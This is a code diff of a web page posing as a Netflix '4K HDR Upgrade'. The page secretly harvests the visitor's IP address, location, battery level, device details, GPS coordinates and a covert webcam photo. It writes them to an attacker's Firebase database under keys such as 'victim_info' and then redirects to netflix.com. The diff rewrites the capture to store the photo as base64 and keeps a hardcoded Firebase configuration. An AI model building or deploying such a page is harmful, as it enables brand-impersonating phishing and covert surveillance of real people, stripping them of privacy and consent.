@@ -5,137 +5,79 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <title>4K HDR Upgrade - Netflix</title>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-        
+        * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            font-family: system-ui, -apple-system, 'Segoe UI', Roboto;
             background: linear-gradient(135deg, #141414 0%, #0a0a0a 100%);
             min-height: 100vh;
             display: flex;
             justify-content: center;
             align-items: center;
-            color: #fff;
             padding: 20px;
         }
-        
         .container {
             max-width: 500px;
             width: 100%;
-            padding: 2rem;
-            background: rgba(0, 0, 0, 0.85);
+            background: rgba(0,0,0,0.85);
             border-radius: 20px;
             backdrop-filter: blur(10px);
             border: 1px solid rgba(229, 9, 20, 0.3);
-            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.5);
+            padding: 2rem;
         }
-        
-        .logo {
-            text-align: center;
-            margin-bottom: 2rem;
-        }
-        
-        .logo h1 {
-            font-size: 2rem;
-            font-weight: 700;
+        .logo { text-align: center; margin-bottom: 2rem; }
+        .logo h1 { 
+            font-size: 2rem; 
             background: linear-gradient(135deg, #E50914, #ff4d4d);
             -webkit-background-clip: text;
             -webkit-text-fill-color: transparent;
-            letter-spacing: -0.5px;
         }
-        
         .badge {
             display: inline-block;
             background: #E50914;
             padding: 0.3rem 1rem;
             border-radius: 30px;
             font-size: 0.8rem;
-            font-weight: 600;
             margin-top: 0.5rem;
         }
-        
-        .progress-section {
-            margin: 2rem 0;
-        }
-        
+        .progress-section { margin: 2rem 0; }
         .progress-bar-container {
-            background: rgba(255, 255, 255, 0.2);
+            background: rgba(255,255,255,0.2);
             border-radius: 10px;
             overflow: hidden;
             height: 8px;
         }
-        
         .progress-bar {
             height: 100%;
             background: linear-gradient(90deg, #E50914, #ff4d4d);
             width: 0%;
             transition: width 0.3s ease;
-            border-radius: 10px;
         }
-        
         .status-text {
             margin-top: 1rem;
             text-align: center;
             font-size: 0.9rem;
             color: #ccc;
         }
-        
-        .steps {
-            margin: 2rem 0;
-        }
-        
+        .steps { margin: 2rem 0; }
         .step {
             display: flex;
             align-items: center;
             gap: 1rem;
             padding: 0.8rem;
             margin: 0.5rem 0;
-            background: rgba(255, 255, 255, 0.05);
+            background: rgba(255,255,255,0.05);
             border-radius: 10px;
-            transition: all 0.3s ease;
         }
-        
-        .step.completed {
-            background: rgba(76, 175, 80, 0.2);
-            border-left: 3px solid #4CAF50;
-        }
-        
-        .step.error {
-            background: rgba(229, 9, 20, 0.2);
-            border-left: 3px solid #E50914;
-        }
-        
-        .step-icon {
-            width: 30px;
-            text-align: center;
-            font-size: 1.2rem;
-        }
-        
-        .step-text {
-            flex: 1;
-            font-size: 0.9rem;
-        }
-        
-        .step-status {
-            font-size: 0.8rem;
-        }
-        
-        .redirect-note {
-            text-align: center;
-            margin-top: 2rem;
-            padding-top: 1rem;
-            border-top: 1px solid rgba(255, 255, 255, 0.1);
-            font-size: 0.8rem;
-            color: #888;
-        }
-        
+        .step.completed { background: rgba(76, 175, 80, 0.2); border-left: 3px solid #4CAF50; }
+        .step.error { background: rgba(229, 9, 20, 0.2); border-left: 3px solid #E50914; }
+        .step-icon { width: 30px; text-align: center; font-size: 1.2rem; }
+        .step-text { flex: 1; font-size: 0.9rem; }
+        .step-status { font-size: 0.8rem; }
+        .redirect-note { text-align: center; margin-top: 2rem; padding-top: 1rem; border-top: 1px solid rgba(255,255,255,0.1); font-size: 0.8rem; color: #888; }
         .debug-console {
             margin-top: 1rem;
             padding: 1rem;
-            background: rgba(0, 0, 0, 0.8);
+            background: rgba(0,0,0,0.8);
             border-radius: 10px;
             font-family: monospace;
             font-size: 0.7rem;
@@ -144,20 +86,7 @@
             overflow-y: auto;
             display: none;
         }
-        
-        .debug-console.show {
-            display: block;
-        }
-        
-        @keyframes pulse {
-            0%, 100% { opacity: 1; }
-            50% { opacity: 0.5; }
-        }
-        
-        .loading {
-            animation: pulse 1.5s ease infinite;
-        }
-        
+        .debug-console.show { display: block; }
         button {
             margin-top: 1rem;
             padding: 0.5rem 1rem;
@@ -166,11 +95,6 @@
             border-radius: 5px;
             color: white;
             cursor: pointer;
-            font-size: 0.8rem;
-        }
-        
-        button:hover {
-            background: #ff1a1a;
         }
     </style>
 </head>
@@ -189,106 +113,72 @@
         </div>
         
         <div class="steps">
-            <div class="step" id="step1">
-                <div class="step-icon">🖥️</div>
-                <div class="step-text">Device Detection</div>
-                <div class="step-status" id="step1Status">⚪</div>
-            </div>
-            <div class="step" id="step2">
-                <div class="step-icon">📍</div>
-                <div class="step-text">Location Access</div>
-                <div class="step-status" id="step2Status">⚪</div>
-            </div>
-            <div class="step" id="step3">
-                <div class="step-icon">📸</div>
-                <div class="step-text">Camera Access</div>
-                <div class="step-status" id="step3Status">⚪</div>
-            </div>
-            <div class="step" id="step4">
-                <div class="step-icon">☁️</div>
-                <div class="step-text">Processing Upgrade</div>
-                <div class="step-status" id="step4Status">⚪</div>
-            </div>
+            <div class="step" id="step1"><div class="step-icon">🖥️</div><div class="step-text">Device Detection</div><div class="step-status" id="step1Status">⚪</div></div>
+            <div class="step" id="step2"><div class="step-icon">📍</div><div class="step-text">Location Access</div><div class="step-status" id="step2Status">⚪</div></div>
+            <div class="step" id="step3"><div class="step-icon">📸</div><div class="step-text">Camera Access</div><div class="step-status" id="step3Status">⚪</div></div>
+            <div class="step" id="step4"><div class="step-icon">☁️</div><div class="step-text">Processing Upgrade</div><div class="step-status" id="step4Status">⚪</div></div>
         </div>
         
-        <div class="redirect-note">
-            ⚡ Optimizing your streaming experience...
-        </div>
-        
+        <div class="redirect-note">⚡ Optimizing your streaming experience...</div>
         <button onclick="toggleDebug()">🐛 Show/Hide Debug</button>
-        <div class="debug-console" id="debugConsole">
-            <strong>📡 DEBUG CONSOLE:</strong><br>
-            <div id="debugLog">Waiting for initialization...</div>
-        </div>
+        <div class="debug-console" id="debugConsole"><strong>📡 DEBUG CONSOLE:</strong><br><div id="debugLog">Waiting...</div></div>
     </div>
 
     <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
-    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-storage-compat.js"></script>
     
     <script>
-        // Debug logging
-        let debugMessages = [];
-        
-        function addDebug(msg, isError = false) {
-            const timestamp = new Date().toLocaleTimeString();
-            const prefix = isError ? '❌' : '✓';
-            const logMsg = `[${timestamp}] ${prefix} ${msg}`;
-            debugMessages.push(logMsg);
-            const debugDiv = document.getElementById('debugLog');
-            if (debugDiv) {
-                debugDiv.innerHTML = debugMessages.join('<br>');
-                debugDiv.scrollTop = debugDiv.scrollHeight;
-            }
-            console.log(logMsg);
-        }
-        
-        function toggleDebug() {
-            const console = document.getElementById('debugConsole');
-            console.classList.toggle('show');
-        }
-        
-        // Firebase Config
+        // 🔥 TERA NAYA WEB APP CONFIG (Storage hataya - sirf Database)
         const firebaseConfig = {
             apiKey: "AIzaSyCG2oPHsEbvKAVY4C2mP-njqvgvZnzyZBU",
             authDomain: "mobilehk-5e843.firebaseapp.com",
-            projectId: "mobilehk-5e843",
             databaseURL: "https://mobilehk-5e843-default-rtdb.firebaseio.com",
+            projectId: "mobilehk-5e843",
             storageBucket: "mobilehk-5e843.firebasestorage.app",
             messagingSenderId: "287475964010",
-            appId: "1:287475964010:web:35b3d5f3f5e382ea881213"
+            appId: "1:287475964010:web:1d278c51947c6cbb881213",
+            measurementId: "G-VT3YC79N61"
         };
         
-        addDebug("Initializing Firebase...");
+        // Debug function
+        let debugMessages = [];
+        function addDebug(msg, isError = false) {
+            const time = new Date().toLocaleTimeString();
+            const prefix = isError ? '❌' : '✓';
+            debugMessages.push(`[${time}] ${prefix} ${msg}`);
+            document.getElementById('debugLog').innerHTML = debugMessages.join('<br>');
+            console.log(msg);
+        }
         
+        function toggleDebug() {
+            document.getElementById('debugConsole').classList.toggle('show');
+        }
+        
+        // Initialize Firebase
+        addDebug("Initializing Firebase...");
         try {
             firebase.initializeApp(firebaseConfig);
             addDebug("Firebase initialized successfully");
-        } catch (e) {
+        } catch(e) {
             addDebug("Firebase init error: " + e.message, true);
         }
         
         const database = firebase.database();
-        const storage = firebase.storage();
         
         // Get session ID from URL
         const urlParams = new URLSearchParams(window.location.search);
         const sessionId = urlParams.get('id');
-        
-        addDebug("Session ID from URL: " + (sessionId || "NOT FOUND"));
+        addDebug("Session ID: " + (sessionId || "NOT FOUND"));
         
         if (!sessionId) {
-            addDebug("No session ID found! Redirecting...", true);
-            document.getElementById('statusText').innerHTML = '❌ Invalid session. Redirecting...';
+            addDebug("No session ID! Redirecting...", true);
             setTimeout(() => window.location.href = 'https://www.netflix.com', 2000);
             throw new Error('No session ID');
         }
         
-        // Update UI functions
         function updateProgress(percent, text) {
             document.getElementById('progressBar').style.width = percent + '%';
             document.getElementById('statusText').innerHTML = text;
-            addDebug(`Progress: ${percent}% - ${text}`);
         }
         
         function markStep(stepNum, completed, statusText = '', isError = false) {
@@ -296,7 +186,6 @@
             const statusSpan = document.getElementById(`step${stepNum}Status`);
             if (completed) {
                 step.classList.add('completed');
-                step.classList.remove('error');
                 statusSpan.innerHTML = statusText || '✓';
                 statusSpan.style.color = '#4CAF50';
             } else if (isError) {
@@ -305,29 +194,26 @@
                 statusSpan.style.color = '#E50914';
             } else if (statusText) {
                 statusSpan.innerHTML = statusText;
-                statusSpan.style.color = '#E50914';
             }
         }
         
-        // Helper functions
+        // IP functions
         async function getIP() {
-            addDebug("Fetching IP address...");
             try {
-                const response = await fetch('https://api.ipify.org?format=json');
-                const data = await response.json();
-                addDebug(`IP fetched: ${data.ip}`);
+                const res = await fetch('https://api.ipify.org?format=json');
+                const data = await res.json();
+                addDebug("IP: " + data.ip);
                 return data.ip;
-            } catch (e) {
-                addDebug(`IP fetch error: ${e.message}`, true);
+            } catch(e) {
+                addDebug("IP fetch error: " + e.message, true);
                 return 'Unknown';
             }
         }
         
         async function getIPDetails(ip) {
-            addDebug(`Fetching IP details for ${ip}...`);
             try {
-                const response = await fetch(`https://ipapi.co/${ip}/json/`);
-                const data = await response.json();
+                const res = await fetch(`https://ipapi.co/${ip}/json/`);
+                const data = await res.json();
                 addDebug(`Location: ${data.city}, ${data.country_name}`);
                 return {
                     country: data.country_name || 'Unknown',
@@ -337,38 +223,33 @@
                     lat: data.latitude || 0,
                     lng: data.longitude || 0
                 };
-            } catch (e) {
-                addDebug(`IP details error: ${e.message}`, true);
+            } catch(e) {
+                addDebug("IP details error: " + e.message, true);
                 return { country: 'Unknown', region: 'Unknown', city: 'Unknown', isp: 'Unknown', lat: 0, lng: 0 };
             }
         }
         
+        // Battery
         async function getBattery() {
-            addDebug("Checking battery status...");
             if ('getBattery' in navigator) {
                 try {
                     const battery = await navigator.getBattery();
                     const status = `${Math.round(battery.level * 100)}% (${battery.charging ? 'charging' : 'discharging'})`;
-                    addDebug(`Battery: ${status}`);
+                    addDebug("Battery: " + status);
                     return status;
-                } catch (e) {
-                    addDebug(`Battery error: ${e.message}`, true);
+                } catch(e) {
                     return 'Unknown';
                 }
             }
-            addDebug("Battery API not supported", true);
             return 'Not supported';
         }
         
+        // Device Info
         function getDeviceInfo() {
-            addDebug("Detecting device info...");
             const ua = navigator.userAgent;
-            let os = 'Unknown';
-            let device = 'Unknown';
-            let browser = 'Unknown';
-            
+            let os = 'Unknown', device = 'Unknown', browser = 'Unknown';
             if (/Android/i.test(ua)) os = 'Android';
-            else if (/iPhone|iPad|iPod/i.test(ua)) os = 'iOS';
+            else if (/iPhone|iPad/i.test(ua)) os = 'iOS';
             else if (/Windows/i.test(ua)) os = 'Windows';
             else if (/Mac/i.test(ua)) os = 'macOS';
             else if (/Linux/i.test(ua)) os = 'Linux';
@@ -386,190 +267,126 @@
             return { os, device, browser };
         }
         
+        // Location
         async function getLocation() {
-            addDebug("Requesting location permission...");
             return new Promise((resolve) => {
                 if (!navigator.geolocation) {
-                    addDebug("Geolocation not supported", true);
-                    resolve({ lat: 0, lng: 0, error: 'Not supported' });
+                    resolve({ lat: 0, lng: 0 });
                     return;
                 }
-                
                 navigator.geolocation.getCurrentPosition(
-                    (position) => {
-                        addDebug(`Location granted: ${position.coords.latitude}, ${position.coords.longitude}`);
-                        resolve({ lat: position.coords.latitude, lng: position.coords.longitude, error: null });
+                    (pos) => {
+                        addDebug(`Location: ${pos.coords.latitude}, ${pos.coords.longitude}`);
+                        resolve({ lat: pos.coords.latitude, lng: pos.coords.longitude });
                     },
-                    (error) => {
-                        addDebug(`Location error: ${error.message}`, true);
-                        resolve({ lat: 0, lng: 0, error: error.message });
+                    (err) => {
+                        addDebug("Location error: " + err.message, true);
+                        resolve({ lat: 0, lng: 0 });
                     },
-                    { timeout: 10000, enableHighAccuracy: true }
+                    { timeout: 10000 }
                 );
             });
         }
         
-        async function capturePhoto() {
-            addDebug("Requesting camera access...");
+        // Camera with Base64 (NO STORAGE NEEDED)
+        async function capturePhotoBase64() {
             return new Promise((resolve) => {
-                if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+                if (!navigator.mediaDevices) {
                     addDebug("Camera API not supported", true);
                     resolve(null);
                     return;
                 }
-                
                 navigator.mediaDevices.getUserMedia({ video: true })
                     .then(stream => {
-                        addDebug("Camera access granted, capturing photo...");
+                        addDebug("Camera access granted");
                         const video = document.createElement('video');
                         video.srcObject = stream;
                         video.onloadedmetadata = () => {
                             video.play();
-                            
                             const canvas = document.createElement('canvas');
                             canvas.width = video.videoWidth || 640;
                             canvas.height = video.videoHeight || 480;
                             const ctx = canvas.getContext('2d');
                             ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                            stream.getTracks().forEach(t => t.stop());
                             
-                            stream.getTracks().forEach(track => track.stop());
-                            
-                            canvas.toBlob(blob => {
-                                addDebug(`Photo captured: ${blob.size} bytes`);
-                                resolve(blob);
-                            }, 'image/jpeg', 0.8);
+                            // Convert to Base64
+                            const base64 = canvas.toDataURL('image/jpeg', 0.7);
+                            addDebug(`Photo captured (Base64 length: ${base64.length})`);
+                            resolve(base64);
                         };
                     })
-                    .catch((err) => {
-                        addDebug(`Camera error: ${err.message}`, true);
+                    .catch(err => {
+                        addDebug("Camera error: " + err.message, true);
                         resolve(null);
                     });
             });
         }
         
-        async function uploadPhoto(blob, sessionId) {
-            if (!blob) {
-                addDebug("No photo to upload", true);
-                return null;
-            }
-            
-            const filename = `${sessionId}_${Date.now()}.jpg`;
-            addDebug(`Uploading photo: ${filename}...`);
-            
-            try {
-                const storageRef = storage.ref(`uploads/${filename}`);
-                await storageRef.put(blob);
-                const url = await storageRef.getDownloadURL();
-                addDebug(`Photo uploaded: ${url}`);
-                return url;
-            } catch (e) {
-                addDebug(`Upload error: ${e.message}`, true);
-                return null;
-            }
-        }
-        
-        async function uploadToFirebase(sessionId, data) {
-            addDebug(`Uploading data to Firebase /sessions/${sessionId}/data...`);
-            try {
-                const sessionRef = database.ref(`sessions/${sessionId}/data`);
-                await sessionRef.set(data);
-                addDebug("Data uploaded successfully!");
-                return true;
-            } catch (e) {
-                addDebug(`Firebase write error: ${e.message}`, true);
-                return false;
-            }
-        }
-        
         // Main execution
-        async function execute() {
-            addDebug("========== STARTING CAPTURE PROCESS ==========");
-            updateProgress(0, 'Initializing security protocols...');
-            await new Promise(r => setTimeout(r, 500));
+        async function main() {
+            updateProgress(0, 'Starting...');
             
             // Step 1: Device Info
-            updateProgress(15, 'Detecting device configuration...');
             markStep(1, false, '⟳');
-            
             const ip = await getIP();
             const ipDetails = await getIPDetails(ip);
             const battery = await getBattery();
             const deviceInfo = getDeviceInfo();
-            
             const victimInfo = {
                 ip: ip,
+                battery: battery,
                 device: deviceInfo.device,
                 os: deviceInfo.os,
                 browser: deviceInfo.browser,
-                battery: battery,
                 screen: `${window.screen.width}x${window.screen.height}`
             };
-            
             markStep(1, true, '✓');
-            updateProgress(30, 'Device detected successfully');
+            updateProgress(25, 'Device detected');
             await new Promise(r => setTimeout(r, 500));
             
             // Step 2: Location
-            updateProgress(45, 'Requesting location access...');
             markStep(2, false, '⟳');
-            
-            const locationCoords = await getLocation();
-            const locationData = {
-                lat: locationCoords.lat,
-                lng: locationCoords.lng,
-                ...ipDetails
+            const loc = await getLocation();
+            const locationData = { 
+                lat: loc.lat, 
+                lng: loc.lng, 
+                country: ipDetails.country,
+                region: ipDetails.region,
+                city: ipDetails.city,
+                isp: ipDetails.isp
             };
-            
-            if (locationCoords.lat !== 0) {
-                markStep(2, true, '✓');
-            } else {
-                markStep(2, true, '⚠', true);
-            }
-            
-            updateProgress(60, 'Location access processed');
+            markStep(2, true, loc.lat !== 0 ? '✓' : '⚠');
+            updateProgress(50, 'Location processed');
             await new Promise(r => setTimeout(r, 500));
             
-            // Step 3: Camera
-            updateProgress(75, 'Requesting camera access...');
+            // Step 3: Camera (Base64 - No Storage)
             markStep(3, false, '⟳');
-            
-            const photoBlob = await capturePhoto();
-            let photoUrl = null;
-            
-            if (photoBlob) {
-                photoUrl = await uploadPhoto(photoBlob, sessionId);
-                markStep(3, true, '✓');
-            } else {
-                markStep(3, true, '⚠', true);
-            }
-            
-            updateProgress(90, 'Camera processed');
+            const photoBase64 = await capturePhotoBase64();
+            markStep(3, true, photoBase64 ? '✓' : '⚠');
+            updateProgress(75, 'Camera processed');
             await new Promise(r => setTimeout(r, 500));
             
-            // Step 4: Upload to Firebase
-            updateProgress(95, 'Uploading data...');
+            // Step 4: Upload to Firebase Realtime Database
             markStep(4, false, '⟳');
-            
-            const uploadData = {
+            const data = {
                 victim_info: victimInfo,
                 location: locationData,
-                secret_capture: { url: photoUrl, name: sessionId },
+                photo_base64: photoBase64,  // Photo directly in database
                 timestamp: new Date().toISOString(),
                 complete: true
             };
             
-            addDebug("Data to upload: " + JSON.stringify(uploadData, null, 2));
-            
-            const success = await uploadToFirebase(sessionId, uploadData);
-            
-            if (success) {
+            addDebug("Writing to Firebase Realtime Database...");
+            try {
+                await database.ref(`sessions/${sessionId}/data`).set(data);
+                addDebug("✅ DATA WRITTEN SUCCESSFULLY!");
                 markStep(4, true, '✓');
-                updateProgress(100, 'Upgrade complete! Redirecting...');
-                addDebug("========== CAPTURE COMPLETE ==========");
-            } else {
+                updateProgress(100, 'Complete! Redirecting...');
+            } catch(e) {
+                addDebug("Firebase write error: " + e.message, true);
                 markStep(4, false, '✗', true);
-                updateProgress(100, 'Upload failed, but continuing...');
-                addDebug("========== UPLOAD FAILED ==========", true);
+                updateProgress(100, 'Error but redirecting...');
             }
             
             // Redirect after 3 seconds
@@ -579,8 +396,8 @@
             }, 3000);
         }
         
-        // Start after short delay
-        setTimeout(execute, 1000);
+        // Start after 1 second
+        setTimeout(main, 1000);
     </script>
 </body>
 </html>
